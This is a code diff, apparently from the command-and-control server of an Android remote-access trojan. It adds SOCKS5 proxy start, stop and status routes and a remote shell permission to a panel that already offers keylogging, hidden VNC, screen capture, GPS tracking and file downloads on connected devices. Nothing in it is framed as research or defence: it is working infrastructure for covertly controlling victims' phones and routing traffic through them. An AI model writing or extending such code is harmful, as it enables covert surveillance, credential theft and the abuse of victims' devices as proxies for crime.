@@ -38,6 +38,8 @@ const PAGE_PERMISSIONS: Record<string, Permission> = {
   screen: 'device:screen',
   keylogger: 'device:keylogger',
   keylogger_status: 'device:keylogger',
+  proxy: 'device:proxy',
+  shell: 'device:shell',
   downloads: 'files:download',
 };
 
@@ -367,11 +369,18 @@ export async function deviceRoutes(app: FastifyInstance) {
     const hvncCommands: CmdType[] = [CMD.HVNC, CMD.HVNC_CTRL, CMD.HVNC_OFFER, CMD.HVNC_ANSWER, CMD.HVNC_ICE];
     const allRealtimeCommands = [...screenCommands, ...hvncCommands];
     const user = getRequestUser(request);
-    const requiredPermission: Permission = hvncCommands.includes(cmdType)
-      ? 'device:hvnc'
-      : screenCommands.includes(cmdType)
-        ? 'device:screen'
-        : 'device:command';
+    let requiredPermission: Permission;
+    if (hvncCommands.includes(cmdType)) {
+      requiredPermission = 'device:hvnc';
+    } else if (screenCommands.includes(cmdType)) {
+      requiredPermission = 'device:screen';
+    } else if (cmdType === (CMD as any).PROXY) {
+      requiredPermission = 'device:proxy';
+    } else if (cmdType === (CMD as any).SHELL) {
+      requiredPermission = 'device:shell';
+    } else {
+      requiredPermission = 'device:command';
+    }
     if (!user.permissions?.includes(requiredPermission)) {
       return reply.code(403).send({ success: false, error: 'Insufficient command permission' });
     }
@@ -383,6 +392,47 @@ export async function deviceRoutes(app: FastifyInstance) {
 
     const sent = socketService.send(id, cmdType, params);
     return { success: true, sent, queued: !sent && !allRealtimeCommands.includes(cmdType) };
+  });
+
+  // ── SOCKS5 Proxy control routes ──────────────────────────────────
+
+  app.post('/api/proxy/:id/start', {
+    preHandler: [app.auth, requirePermission('device:proxy')],
+  }, async (request, reply) => {
+    const { id } = request.params as { id: string };
+    const body = request.body as Record<string, unknown> | undefined;
+    const port = typeof body?.port === 'number' ? body.port : 1080;
+
+    if (!socketService.isClientConnected(id)) {
+      return reply.code(400).send({ success: false, error: 'Device is offline' });
+    }
+
+    const started = socketService.startProxyServer(id, port);
+    if (!started) {
+      return reply.code(409).send({ success: false, error: 'Proxy server already running' });
+    }
+
+    // Also send start command to Android to prepare proxy service
+    socketService.send(id, CMD.PROXY as CmdType, { action: 'start' });
+
+    return { success: true, port };
+  });
+
+  app.post('/api/proxy/:id/stop', {
+    preHandler: [app.auth, requirePermission('device:proxy')],
+  }, async (request, reply) => {
+    const { id } = request.params as { id: string };
+    socketService.stopProxyServer();
+    socketService.send(id, CMD.PROXY as CmdType, { action: 'stop' });
+    return { success: true };
+  });
+
+  app.get('/api/proxy/:id/status', {
+    preHandler: [app.auth, requirePermission('device:proxy')],
+  }, async (request, reply) => {
+    const running = socketService.isProxyRunning();
+    const connections = socketService.getProxyConnections();
+    return { success: true, running, connections };
   });
 
   app.post('/api/gps/:id/:interval', {
@@ -496,6 +546,13 @@ function getPageData(id: string, page: string, client: any) {
     }
     case 'screen':
       return {};  // WebRTC media and real-time screen state are not stored in DB.
+    case 'proxy':
+      return {
+        running: socketService.isProxyRunning(),
+        connections: socketService.getProxyConnections(),
+      };
+    case 'shell':
+      return {};  // Shell is real-time; no persistent state
     default:
       return { client: formatClient(client) };
   }
